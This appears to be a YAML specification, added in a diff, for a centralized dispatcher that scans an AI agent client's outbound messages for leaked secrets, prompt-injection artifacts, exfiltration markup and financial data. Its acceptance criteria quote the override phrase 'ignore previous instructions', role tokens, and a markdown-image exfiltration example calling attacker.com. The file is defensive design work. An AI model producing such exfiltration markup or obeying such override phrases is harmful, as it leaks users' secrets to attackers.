@@ -1,0 +1,246 @@
+# ─── Identity ───────────────────────────────────────────────
+id: CELLO-SCAN-003
+domain: Scanning Pipeline
+actor: CLIENT
+priority: P0
+components:
+  - client
+
+# ─── Intent ─────────────────────────────────────────────────
+story: >
+  As the CELLO Client,
+  I want every outbound message to pass through a centralized dispatcher that
+  checks for secrets, injection artifacts, data exfiltration patterns, and
+  financial data — and includes a local-model terms-violation self-check —
+  before it is handed to any delivery channel
+  so that a successful inbound injection that manipulates the agent into producing
+  harmful output is caught at the exit point and never reaches the counterparty
+  or any notification channel.
+
+  Layer 3 is a blocking gate: if any check fires, the message is blocked and
+  Layer 4 does not run. If all checks pass, the message proceeds to Layer 4.
+
+  The centralized dispatcher is an architectural invariant: all delivery channels
+  (libp2p message delivery, notification channels) must route through it. No
+  channel may call a delivery client directly, bypassing the dispatcher.
+
+# ─── Behavior (EARS) ───────────────────────────────────────
+behavior:
+  - trigger: "When any component prepares to send an outbound message to any channel"
+    action: "the component shall route the message through the centralized dispatcher;
+      it shall never call a channel delivery client directly"
+
+  - trigger: "When the dispatcher receives an outbound message"
+    action: "the dispatcher shall run all pattern checks synchronously (no API calls)
+      in the following order: secrets and internal paths, injection artifacts,
+      data exfiltration patterns, financial data; if any check fires, the message
+      is blocked and a detection event is logged; if all checks pass, the message
+      is forwarded to Layer 4"
+
+  - trigger: "When the secrets check runs"
+    action: "the dispatcher shall match the outbound text against patterns for API
+      keys (sk-..., AIza..., xoxb-..., ghp_..., xoxp-..., Bot ..., Bearer ...),
+      auth tokens, internal file paths, and network addresses that may have leaked
+      from document processing"
+
+  - trigger: "When the injection artifact check runs"
+    action: "the dispatcher shall match for role marker tokens and override phrases
+      that survived into output (e.g., [SYSTEM], <|im_start|>, <<SYS>>, 'ignore
+      previous instructions' appearing in the response body); their presence in
+      outbound text indicates an upstream injection succeeded"
+
+  - trigger: "When the data exfiltration check runs"
+    action: "the dispatcher shall match for: markdown image URLs with query
+      parameters (![...](https://...?...)), HTML img/script/iframe tags with
+      external src attributes, CSS url() references to external resources,
+      hyperlinks with data in path, query, or fragment, and plain-text external
+      URLs followed by encoded data strings; see §3.2 of the attack-corpus-reference
+      for the full exfiltration pattern set"
+
+  - trigger: "When the financial data check runs"
+    action: "the dispatcher shall match for dollar amounts and financial figures
+      that may constitute leakage of internal pricing or deal terms; amounts on
+      the configured financial allowlist are exempt"
+
+  - trigger: "When the terms-violation self-check runs"
+    action: "the dispatcher shall invoke the local model (zero API cost, no external
+      latency) to evaluate whether the outbound content could constitute a terms of
+      service violation — prompt injection artifacts, prohibited content, or content
+      that resembles the result of a successful manipulation; if the check fires,
+      delivery is blocked and the local-model judgment is logged alongside the
+      Merkle leaf for the blocked message"
+
+  - trigger: "When the terms-violation self-check passes and the message is sent"
+    action: "the dispatcher shall record the self-check judgment in the audit log
+      alongside the outbound Merkle leaf; this record serves as evidence in any
+      subsequent appeal that the content was evaluated and found clean before sending"
+
+  - trigger: "If any dispatcher check throws an unhandled exception"
+    action: "the dispatcher shall block the message by default; it shall never
+      pass a message through as a result of a check failure"
+
+# ─── Acceptance Criteria ────────────────────────────────────
+acceptance_criteria:
+  - id: AC-001
+    given: "An outbound message containing an OpenAI-format API key (sk-...)"
+    when: "The dispatcher's secrets check runs"
+    then: "The check fires; the message is blocked; the detection event log records
+      layer 3, source type, and the matched secret pattern (not the secret value)"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-002
+    given: "An outbound message containing a Telegram bot token (Bot ...)"
+    when: "The dispatcher's secrets check runs"
+    then: "The check fires; the message is blocked"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-003
+    given: "An outbound message containing an internal file path
+      (e.g., '/var/secrets/db_password')"
+    when: "The dispatcher's secrets check runs"
+    then: "The check fires; the message is blocked"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-004
+    given: "An outbound message containing the role marker token '[SYSTEM]'
+      in the response body (injection artifact that survived into output)"
+    when: "The dispatcher's injection artifact check runs"
+    then: "The check fires; the message is blocked; the detection event indicates
+      that an injection artifact was detected in outbound content"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-005
+    given: "An outbound message containing a markdown image URL with a query
+      parameter carrying encoded data: '![x](https://attacker.com/c?d=STOLEN)'"
+    when: "The dispatcher's data exfiltration check runs"
+    then: "The pattern matches; the message is blocked"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-006
+    given: "An outbound message containing an HTML img tag with external src
+      carrying encoded data"
+    when: "The dispatcher's data exfiltration check runs"
+    then: "The pattern matches; the message is blocked"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-007
+    given: "An outbound message containing a CSS url() reference to an external
+      resource"
+    when: "The dispatcher's data exfiltration check runs"
+    then: "The pattern matches; the message is blocked"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-008
+    given: "An outbound message containing a dollar amount NOT on the financial
+      allowlist"
+    when: "The dispatcher's financial data check runs"
+    then: "The check fires; the message is blocked"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-009
+    given: "An outbound message containing a dollar amount that IS on the
+      configured financial allowlist (e.g., a legitimate template price)"
+    when: "The dispatcher's financial data check runs"
+    then: "The amount does not trigger a block; the message proceeds normally"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-010
+    given: "An outbound message that is a normal, non-problematic response"
+    when: "All dispatcher checks run"
+    then: "All checks pass; the message is forwarded to Layer 4; no detection
+      event is logged"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-011
+    given: "A component attempts to send a message by calling a channel delivery
+      client directly, bypassing the dispatcher"
+    when: "The code is reviewed or the type system is inspected"
+    then: "No direct channel client call exists outside the dispatcher; all
+      outbound paths route through the dispatcher (verified by code structure,
+      not by runtime assertion)"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-012
+    given: "A dispatcher check throws an unhandled exception during pattern matching"
+    when: "The exception propagates"
+    then: "The message is blocked; the exception is logged as a detection event;
+      the message is not passed through"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-013
+    given: "The terms-violation self-check fires on an outbound message"
+    when: "The check blocks the message"
+    then: "The local-model judgment is logged alongside the Merkle leaf for the
+      blocked message; the log includes the verdict and the timestamp"
+    test_type: unit
+    component_under_test: client
+
+  - id: AC-014
+    given: "The terms-violation self-check passes and the message is sent"
+    when: "The message is delivered"
+    then: "The self-check judgment is recorded in the audit log alongside the
+      outbound Merkle leaf; a subsequent appeal can reference this record as
+      evidence the content was evaluated before sending"
+    test_type: unit
+    component_under_test: client
+
+# ─── Security Invariants ───────────────────────────────────
+security_invariants:
+  - id: SI-001
+    statement: "The dispatcher shall never allow any delivery channel to bypass it"
+    adversarial_condition: "even when a new delivery channel is added to the
+      codebase — the architectural rule is enforced by code structure: the only
+      path to a channel delivery client is through the dispatcher"
+    test_type: unit
+    component_under_test: client
+
+  - id: SI-002
+    statement: "The dispatcher shall never pass a message through when any check
+      throws an exception"
+    adversarial_condition: "even when the exception is caused by a deliberately
+      malformed outbound message crafted to trigger a regex error in the pattern
+      matching code"
+    test_type: unit
+    component_under_test: client
+
+  - id: SI-003
+    statement: "Layer 3 shall run before Layer 4; if Layer 3 blocks, Layer 4
+      shall not run"
+    adversarial_condition: "even when a Layer 4 redaction step is configured to
+      redact the very pattern that Layer 3 would block — redaction does not
+      substitute for blocking; a message that should be blocked must be blocked,
+      not sanitized and delivered"
+    test_type: unit
+    component_under_test: client
+
+# ─── Degraded Behavior ─────────────────────────────────────
+degraded_behavior:
+  - id: DB-001
+    condition: "While the local model used by the terms-violation self-check is
+      unavailable (not yet downloaded, corrupt, or hash mismatch)"
+    fallback: "the client shall fail closed and block all outbound messages until
+      the local model is healthy, instead of silently skipping the self-check and
+      delivering content that may contain manipulation artifacts"
+    test_type: unit
+    component_under_test: client
+
+# ─── References ─────────────────────────────────────────────
+references:
+  protocol_map: "Security and Prompt Injection Defense"
+  end_to_end_flow: "§7.1"
+  attack_corpus: "docs/planning/user-stories/m4/attack-corpus-reference.md §3"
+  discussion_logs:
+    - "2026-04-11_1400_security-architecture-layers-and-trust-signal-classes"
+    - "2026-04-08_1900_connection-staking-and-institutional-defense"
